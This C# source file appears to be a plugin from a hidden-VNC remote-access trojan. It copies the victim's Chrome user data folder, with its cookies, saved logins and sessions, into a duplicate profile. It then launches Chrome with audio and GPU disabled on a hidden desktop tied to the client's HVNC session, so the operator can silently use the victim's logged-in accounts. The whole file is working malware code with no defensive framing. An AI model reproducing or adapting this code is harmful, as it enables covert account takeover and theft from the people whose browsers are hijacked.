using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.Devices;

namespace Plugin.Helper.OpenApp;

internal class Chrome
{
	private static readonly Computer PC = new Computer();

	private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data";

	private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\Chrome Data";

	private static readonly string FilenameChrome = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";

	private static readonly string FilenameChromeX86 = "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";

	public static void OpenChromeBrowser()
	{
		HideDesktop.Load(Plugin.HVNCDesktop);
		try
		{
			if (!File.Exists(FilenameChrome) && !File.Exists(FilenameChromeX86))
			{
				return;
			}
			try
			{
				if (!Directory.Exists(fileNameUserDataCopy))
				{
					((ServerComputer)PC).FileSystem.CopyDirectory(fileNameUserData, fileNameUserDataCopy);
				}
			}
			catch
			{
			}
			new Thread((ThreadStart)delegate
			{
				Thread.Sleep(1000);
				HideDesktop.Load(Plugin.HVNCDesktop);
				Open();
			}).Start();
		}
		catch (Exception ex)
		{
			Client.Error("Chrome: " + ex.Message);
		}
	}

	public static void Open()
	{
		try
		{
			string text = null;
			if (File.Exists(FilenameChrome))
			{
				text = FilenameChrome;
			}
			if (File.Exists(FilenameChromeX86))
			{
				text = FilenameChromeX86;
			}
			if (text != null)
			{
				HideDesktop.CreateProcess("\"" + text + "\" --mute-audio --disable-audio --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=" + fileNameUserDataCopy + "\"", Plugin.hwid, bAppName: false);
				Thread.Sleep(3000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("Chrome: " + ex.Message);
		}
	}
}
